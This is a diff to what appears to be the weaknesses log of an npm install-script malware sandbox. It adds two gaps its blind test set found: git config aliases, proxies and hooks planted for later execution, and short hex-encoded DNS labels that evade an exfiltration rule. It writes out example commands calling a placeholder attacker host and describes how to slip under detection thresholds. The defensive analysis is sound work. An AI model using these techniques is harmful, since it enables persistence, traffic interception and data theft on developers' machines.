@@ -23,6 +23,8 @@ touches the Chamber or a live check.
 | W11 | Disclosed package unfixed; name in git history | Medium (ethical) | Ongoing |
 | W12 | Red-team set is not blind | Medium (claim hygiene) | After |
 | W13 | One path where a model decision can clear a rule hit | Medium (claim hygiene) | **Closed in code Nov 3** |
+| W14 | `git config` / `.git/hooks` are an untraced attack surface | Medium (found by the held-out set, Nov 3) | After |
+| W15 | DNS encoded-label rule has a length floor a short label evades | Low–Medium (found by the held-out set, Nov 3) | After |
 
 ---
 
@@ -818,6 +820,61 @@ each tied to a package in the control set. If one of those vendors were compromi
 CDN, a predicted fetch from it would still be cleared. That is a supply-chain assumption, not an
 author-controlled path, and it is the assumption `DEFAULT_ALLOWED_DOMAINS` already makes about
 `registry.npmjs.org`.
+
+---
+
+## W14 — `git config` and `.git/hooks` are an untraced attack surface
+
+**Found by the held-out blind corpus, Nov 3** (`eval/BLIND_RESULTS.md`). Three of that set's four
+rules-level misses share one root cause: an install script can arrange code to run on *later*
+git activity, and nothing inspects it.
+
+- `git config --global alias.X '!curl http://<raw-ip>/…'` — a command fires on later git use
+  (`bc04`).
+- `git config --global http.proxy http://<attacker>` — future git HTTP traffic is MITM'd
+  (`bc10`).
+- writing an executable `.git/hooks/post-checkout` that beacons on the next checkout (`bc03`).
+
+**Why the rules miss it.** All three are **dormant at install time**: the payload does not
+connect, drop a binary, or touch a traced persistence path while the sandbox is watching, so no
+behavioural rule has anything to fire on. Note the exec of `git config …` *is* captured — in
+`bc04` and `bc10` the raw IP is right there in the recorded args — so the evidence exists; no
+rule reads `git config` arguments, and the persistence policy does not cover `.git/hooks/` or
+`~/.gitconfig`.
+
+**Plan (post-judging).** Two measured changes, each gated like every other detection change
+(frozen corpus, benign false-positive rate, rollback):
+- an exec-args rule for `git config --global` writing `http.proxy`, `core.hookspath`, `alias.*`
+  containing a `!`-prefixed shell command, or `url.*.insteadOf` — all of which are install-time
+  red flags and none of which a normal `npm install` runs;
+- extend `persistence-files.yaml` to `.git/hooks/` and `~/.gitconfig` writes, with the same
+  false-positive measurement `FILE_PERSISTENCE` got (0 of 104 benign).
+
+**The model arm may already catch `bc04`/`bc10`**, since the `git config` command is visible in
+the diff; that is unmeasured. The honest statement is that the *deterministic floor* misses them.
+
+**Gate: after judging.** Two new rules two days out, unmeasured against the benign set, is
+exactly the trade this document refuses. Recorded now; measured later.
+
+## W15 — the DNS encoded-label rule has a length floor a short label evades
+
+**Found by the held-out blind corpus, Nov 3.** `DNS_ENCODED_LABEL` fires on an encoded-looking
+label of `MIN_ENCODED_LABEL = 40`+ characters. `bc08` hex-encodes a hostname into a **24-char**
+label — real exfiltration of a short identifier — which sits under the floor, so the rule stays
+silent even though the DNS query is captured in full.
+
+**Why the floor exists, and why it cannot just be lowered.** The threshold is there to avoid
+flagging legitimate long-ish labels — CDN cache keys, content-addressed hashes, telemetry ids —
+which are common and benign. Lowering it trades directly against the benign false-positive rate.
+
+**Plan (post-judging).** Measure the label-length and character-class distribution of DNS
+queries across the 742-install corpus, then set the floor (and perhaps an entropy test) where it
+separates `bc08`-style exfil from benign long labels with zero benign hard blocks — the same
+acceptance every rule change gets. If no clean separation exists, record the negative result and
+leave the floor where it is.
+
+**Gate: after judging.** A one-line constant change to a verdict-affecting rule, without the
+false-positive measurement, is not something to ship two days out.
 
 ---
 
